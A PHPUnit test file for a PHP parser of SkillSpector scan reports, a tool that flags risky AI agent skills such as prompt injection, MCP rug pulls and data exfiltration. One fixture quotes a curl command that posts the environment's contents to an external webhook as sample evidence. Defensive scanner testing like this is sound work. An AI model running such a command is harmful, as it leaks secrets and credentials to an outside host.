<?php

declare(strict_types=1);

namespace Webconsulting\Skillspector\Tests\Unit\Domain\Security;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Webconsulting\Skillspector\Domain\Security\SkillCheckFinding;
use Webconsulting\Skillspector\Domain\Security\SkillspectorReport;

final class SkillspectorReportTest extends TestCase
{
    /**
     * A realistic `skillspector scan -f json` report (structure from the
     * SkillSpector README).
     *
     * @param list<array<string, mixed>> $issues
     */
    private static function scanJson(array $issues = [], string $recommendation = 'DO_NOT_INSTALL', int $score = 82, string $severity = 'CRITICAL'): string
    {
        return (string)json_encode([
            'skill' => ['name' => 'evil-skill', 'source' => '/tmp/evil-skill', 'scanned_at' => '2026-07-12T10:00:00Z'],
            'risk_assessment' => ['score' => $score, 'severity' => $severity, 'recommendation' => $recommendation],
            'components' => [['path' => 'SKILL.md', 'type' => 'markdown', 'lines' => 40, 'executable' => false, 'size_bytes' => 900]],
            'issues' => $issues,
            'metadata' => [
                'has_executable_scripts' => false,
                'skillspector_version' => '1.2.3',
                'llm_requested' => false,
                'llm_available' => false,
            ],
        ]);
    }

    public function testFromScanOutputParsesRiskAssessmentAndMetadata(): void
    {
        $report = SkillspectorReport::fromScanOutput(self::scanJson());

        self::assertSame(SkillspectorReport::STATUS_OK, $report->status);
        self::assertSame(82, $report->score);
        self::assertSame('CRITICAL', $report->severity);
        self::assertSame('DO_NOT_INSTALL', $report->recommendation);
        self::assertSame('1.2.3', $report->version);
        self::assertFalse($report->llmUsed);
        self::assertSame('', $report->note);
    }

    public function testFromScanOutputToleratesLogNoiseBeforeTheJsonDocument(): void
    {
        $report = SkillspectorReport::fromScanOutput("Scanning ./evil-skill ...\nDone.\n" . self::scanJson());

        self::assertSame(SkillspectorReport::STATUS_OK, $report->status);
        self::assertSame(82, $report->score);
    }

    public function testUnparseableOutputBecomesAnErrorReportInsteadOfThrowing(): void
    {
        $report = SkillspectorReport::fromScanOutput('Traceback (most recent call last): boom');

        self::assertSame(SkillspectorReport::STATUS_ERROR, $report->status);
        self::assertSame(-1, $report->score);
        self::assertSame('none', $report->levelFloor());
        self::assertSame([], $report->findings);
        self::assertNotSame('', $report->note);
    }

    public function testLlmUsedRequiresRequestedAndAvailable(): void
    {
        $json = (string)json_encode([
            'risk_assessment' => ['score' => 5, 'severity' => 'LOW', 'recommendation' => 'SAFE'],
            'metadata' => ['llm_requested' => true, 'llm_available' => true, 'skillspector_version' => '1.2.3'],
        ]);

        self::assertTrue(SkillspectorReport::fromScanOutput($json)->llmUsed);
    }

    /**
     * The AGGREGATE recommendation is advisory: it caps at 'warning' and never
     * quarantines on its own. Only a located danger-severity finding reaches
     * 'danger' (covered in SkillCheckReportTest).
     *
     * @return array<string, array{0: string, 1: string}>
     */
    public static function recommendationFloors(): array
    {
        return [
            'DO_NOT_INSTALL is advisory (warning, not danger)' => ['DO_NOT_INSTALL', 'warning'],
            'CAUTION warns' => ['CAUTION', 'warning'],
            'SAFE stays none' => ['SAFE', 'none'],
            'unknown stays none' => ['SOMETHING_NEW', 'none'],
        ];
    }

    #[DataProvider('recommendationFloors')]
    public function testLevelFloorFollowsTheInstallRecommendation(string $recommendation, string $expected): void
    {
        $report = SkillspectorReport::fromScanOutput(self::scanJson([], $recommendation));

        self::assertSame($expected, $report->levelFloor());
    }

    public function testDoNotInstallNeverQuarantinesOnItsOwn(): void
    {
        // Aggregate DO_NOT_INSTALL with only warning-level issues must not reach 'danger'.
        $report = SkillspectorReport::fromScanOutput(self::scanJson([
            ['id' => 'RP1', 'category' => 'MCP Rug Pull', 'severity' => 'HIGH'],
            ['id' => 'RP2', 'category' => 'MCP Rug Pull', 'severity' => 'MEDIUM'],
        ], 'DO_NOT_INSTALL'));

        self::assertSame('warning', $report->levelFloor());
        self::assertNotSame('danger', $report->levelFloor());
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function issueSeverities(): array
    {
        return [
            'CRITICAL maps to danger' => ['CRITICAL', SkillCheckFinding::SEVERITY_DANGER],
            'HIGH maps to warning' => ['HIGH', SkillCheckFinding::SEVERITY_WARNING],
            'MEDIUM maps to warning' => ['MEDIUM', SkillCheckFinding::SEVERITY_WARNING],
            'LOW maps to info' => ['LOW', SkillCheckFinding::SEVERITY_INFO],
            'lowercase input is normalized' => ['critical', SkillCheckFinding::SEVERITY_DANGER],
            'unknown maps to info' => ['BANANAS', SkillCheckFinding::SEVERITY_INFO],
        ];
    }

    #[DataProvider('issueSeverities')]
    public function testIssueSeverityMapping(string $spectorSeverity, string $expected): void
    {
        $report = SkillspectorReport::fromScanOutput(self::scanJson([
            ['id' => 'prompt_injection_1', 'category' => 'Prompt Injection', 'severity' => $spectorSeverity, 'confidence' => 0.9, 'location' => ['file' => 'SKILL.md', 'start_line' => 12]],
        ]));

        self::assertCount(1, $report->findings);
        self::assertSame($expected, $report->findings[0]->severity);
    }

    public function testIssuesAreMappedToFindingsWithLocationConfidenceAndPrefixedId(): void
    {
        // Real SkillSpector 2.x issue shape (finding/explanation/remediation/pattern).
        $report = SkillspectorReport::fromScanOutput(self::scanJson([
            [
                'id' => 'E1',
                'category' => 'Data Exfiltration',
                'pattern' => 'External Transmission',
                'severity' => 'HIGH',
                'confidence' => 0.85,
                'finding' => 'curl -X POST -d "$(env)" https://webhook.site/abc',
                'explanation' => 'Data is being sent to an external URL.',
                'remediation' => 'Remove the webhook call.',
                'location' => ['file' => 'scripts/send.sh', 'start_line' => 3, 'end_line' => null],
            ],
        ]));

        $finding = $report->findings[0];
        self::assertSame('skillspector:E1', $finding->id);
        self::assertSame('Data Exfiltration: External Transmission', $finding->category);
        self::assertSame('scripts/send.sh:3', $finding->location);
        self::assertSame('curl -X POST -d "$(env)" https://webhook.site/abc', $finding->evidence);
        self::assertSame('Remove the webhook call. (confidence 85%)', $finding->whatToCheck);
    }

    public function testIssuesWithReadmeFieldNamesAreStillMapped(): void
    {
        // The field names documented in the SkillSpector README (older shape).
        $report = SkillspectorReport::fromScanOutput(self::scanJson([
            [
                'id' => 'data_exfiltration_2',
                'category' => 'Data Exfiltration',
                'severity' => 'HIGH',
                'title' => 'Sends page content to an external webhook',
                'recommendation' => 'Remove the webhook call.',
                'location' => ['file' => 'scripts/send.sh', 'start_line' => 3],
            ],
        ]));

        $finding = $report->findings[0];
        self::assertSame('Sends page content to an external webhook', $finding->evidence);
        self::assertSame('Remove the webhook call.', $finding->whatToCheck);
    }

    public function testIssueWithoutOptionalFieldsStillProducesAUsableFinding(): void
    {
        $report = SkillspectorReport::fromScanOutput(self::scanJson([
            ['id' => 'x1', 'severity' => 'LOW'],
        ]));

        $finding = $report->findings[0];
        self::assertSame('skillspector:x1', $finding->id);
        self::assertSame('SkillSpector finding', $finding->category);
        self::assertSame('skill', $finding->location);
        self::assertSame('x1', $finding->evidence);
        self::assertStringContainsString('SkillSpector', $finding->whatToCheck);
    }

    public function testIssuesAreCappedAtFortyFindings(): void
    {
        $issues = [];
        for ($i = 0; $i < 55; $i++) {
            $issues[] = ['id' => 'issue_' . $i, 'severity' => 'LOW'];
        }

        $report = SkillspectorReport::fromScanOutput(self::scanJson($issues));

        self::assertCount(40, $report->findings);
    }

    public function testToArraySerializesTheSummaryWithoutTheFindings(): void
    {
        $report = SkillspectorReport::fromScanOutput(self::scanJson([
            ['id' => 'x1', 'severity' => 'CRITICAL'],
        ]));

        self::assertSame([
            'status' => 'ok',
            'score' => 82,
            'severity' => 'CRITICAL',
            'recommendation' => 'DO_NOT_INSTALL',
            'version' => '1.2.3',
            'llmUsed' => false,
            'note' => '',
        ], $report->toArray());
    }

    public function testUnavailableFactoryCarriesTheInstallHintAndNeverRaisesTheLevel(): void
    {
        $report = SkillspectorReport::unavailable('binary not found — install it');

        self::assertSame(SkillspectorReport::STATUS_UNAVAILABLE, $report->status);
        self::assertSame('none', $report->levelFloor());
        self::assertSame('binary not found — install it', $report->note);
        self::assertSame([], $report->findings);
    }

    public function testErrorFactoryNeverRaisesTheLevel(): void
    {
        $report = SkillspectorReport::error('timeout');

        self::assertSame(SkillspectorReport::STATUS_ERROR, $report->status);
        self::assertSame('none', $report->levelFloor());
        self::assertSame('timeout', $report->note);
    }
}


